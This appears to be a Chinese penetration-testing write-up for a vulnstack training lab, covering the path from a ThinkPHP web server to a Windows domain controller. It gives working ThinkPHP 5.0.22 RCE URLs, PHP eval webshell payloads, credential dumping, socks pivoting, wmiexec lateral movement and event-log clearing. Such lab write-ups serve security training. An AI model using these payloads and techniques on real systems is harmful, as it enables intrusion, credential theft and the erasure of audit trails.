## 0x00：前言

ATT&CK第五个攻防靶场虚拟机共用两个，一个外网一个内网，用来练习红队相关内容和方向，主要包括常规信息收集、Web攻防、代码审计、漏洞利用、内网渗透以及域渗透等相关内容学习。

靶场详情：http://vulnstack.qiyuanxuetang.net/vuln/detail/7/

靶场环境：

> 攻击机:192.168.1.10  
> Win7:192.168.1.8 192.168.138.136  
> Win2008:192.168.138.138

## 0x01：信息收集

对目标IP进行端口扫描，发现开启了80和3306端口

nmap -Pn -A -T4
192.168.1.8![v2-ab2d80f3c18fadf60e1f5b2aeac96003_720w.png](https://image.3001.net/images/20210922/1632303298_614af8c2df65549ca4e95.png!small)

访问192.168.1.8发现是一个thinkphp站点，对其进行目录扫描![v2-64962a07fd5d1f953d62eded99c9b947_720w.png](https://image.3001.net/images/20210922/1632303299_614af8c3a42095e8bc992.png!small)

扫描到一个add.php，访问是一个大马，对其进行密码爆破，爆破出密码后，发现大马很多功能都用不了![v2-0a9aec24b7677e6ebda7cf19718e1409_720w.png](https://image.3001.net/images/20210922/1632303300_614af8c471f824e49f44f.png!small)

## 0x02：漏洞利用

通过报错知道ThinkPHP版本为5.0.22，先进行漏洞验证  
http://192.168.1.8/index.php/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1![v2-d51dada957f44f8a7fc0fb4e980c61e7_720w.png](https://image.3001.net/images/20210922/1632303301_614af8c520db80f5e588d.png!small)

  
 **漏洞利用**

发现存在漏洞，使用下面的payload直接写入一句话(其实可以直接登录大马，新建一个PHP文件写入一句话)

http://192.168.1.8/index.php/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir
获取网站物理路径![v2-c6918400e9788456005cee9e8b9f90d4_720w.png](https://image.3001.net/images/20210922/1632303301_614af8c5c3efcdc52bfd4.png!small)

通过system函数写入一句话

http://192.168.1.8/index.php/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo
"<?php @eval($_POST[chan]);?>" >C:/phpStudy/PHPTutorial/WWW/public/chan.php  
  
或者用php文件函数file_put_contents直接写入一句话

http://192.168.1.8/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=2.php&vars[1][]=%3C?php%20@eval($_POST[chan]);?%3E

写入成功后，使用蚁剑进行连接，进行主机信息收集，发现该主机在域内，另一个IP为192.168.138.136![v2-d3b9c856182a4e8f17bd8cb13977dc6e_720w.png](https://image.3001.net/images/20210922/1632303302_614af8c64351773442f7c.png!small)

使用MSF生一个木马，上传到蚁剑上运行![v2-fa42b4a240eae21c36da3c6d6299610c_720w.png](https://image.3001.net/images/20210922/1632303302_614af8c6d0cf0a47056d2.png!small)

MSF监听4444端口，成功获取到一个meterpreter![v2-65c8b556345e9bb39e1860e6757e28e8_720w.png](https://image.3001.net/images/20210922/1632303303_614af8c776a7b84143a94.png!small)

使用getsystem命令提权成功，得到SYSTEM权限![v2-88d52e9a78c3f53f9abfb23961342a6e_720w.png](https://image.3001.net/images/20210922/1632303304_614af8c83c7317689f2c3.png!small)

查看主机运行的进程，发现存在域管理员进程![v2-4b07a9c6d7e0a817e84701bcc62e9e54_720w.png](https://image.3001.net/images/20210922/1632303304_614af8c89a940bcb6d0a2.png!small)

对主机进行密码抓取，成功抓取到域管理员密码![v2-6235274fba881dd13461e23c04f9724f_720w.png](https://image.3001.net/images/20210922/1632303305_614af8c92b42e8d2bb37d.png!small)

切换到域成员进程进行域名信息搜集，域控为192.168.138.138![v2-4799eb7eedfa568446484e0bd972ec31_720w.png](https://image.3001.net/images/20210922/1632303305_614af8c9afbe0ba69f049.png!small)

## 0x03：横向渗透

使用MSF自带模块搭建socks代理

先在meterpreter中使用route进行查看当前靶机win7所在网段的信息![v2-786c21f48dce1708bb14bdc2ca28bb42_720w.png](https://image.3001.net/images/20210922/1632303306_614af8ca35a3e1224ceec.png!small)

使用route增加对应路由

> route add 192.168.138.0 255.255.255.0 2 # 2是挂起session的编号

> use auxiliary/server/socks_proxy  
> set srvhost 127.0.0.1  
> set version 4a  
> exploit

![v2-563931424e619e7fe09b92bfd01b040a_720w.png](https://image.3001.net/images/20210922/1632303306_614af8cacacea57d98eae.png!small)

先进行存活主机探测，发现只有win7和域控win2008![v2-0e4769848e97cb5f4ad795e94d91d6cd_720w.png](https://image.3001.net/images/20210922/1632303307_614af8cb58e196218fbdc.png!small)

端口服务探测  
  
搭建好代理后，对域控进行端口服务扫描

nmap -sT -sV -Pn -p 21,22,53,80,135,139,445,1433,3306,8080,3389
192.168.138.138![v2-338282d1f03c2e51d8530cf6831f12ab_720w.png](https://image.3001.net/images/20210922/1632303307_614af8cbba74d4f500713.png!small)

发现开启了445端口，使用MSF的永恒之蓝模块进行攻击，但是失败了![v2-5a9d7ed1ed6b8c250359abade2894fce_720w.png](https://image.3001.net/images/20210922/1632303308_614af8cc865dd53003ca4.png!small)

![v2-dae02a5871c648c237225ef4a54757f2_720w.png](https://image.3001.net/images/20210922/1632303309_614af8cd2ea88c876914f.png!small)

前面我们已经抓取到了域管理员的密码，使用wmicexec远程连接域控(注:使用WMIC连接远程主机，需要目标开启135和445端口。135端口是WMIC默认的管理端口，WMIC使用445端口传回显)成功连接域控主机，获取域控权限。后面如果想要连接远程桌面的话，可以开启3远程桌面服务，开启3389端口，关闭防火墙即可进行远程桌面登录![v2-f3dbdcdfc8805458622b66595805b871_720w.png](https://image.3001.net/images/20210922/1632303310_614af8ce353d6243187b2.png!small)

## 0x04：日志清理

> 有远程桌面的权限时手动删除日志：  
> 开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志  
> meterpreter自带清除日志功能  
> clearev 清除Windows中的应用程序日志，系统日志安全日志

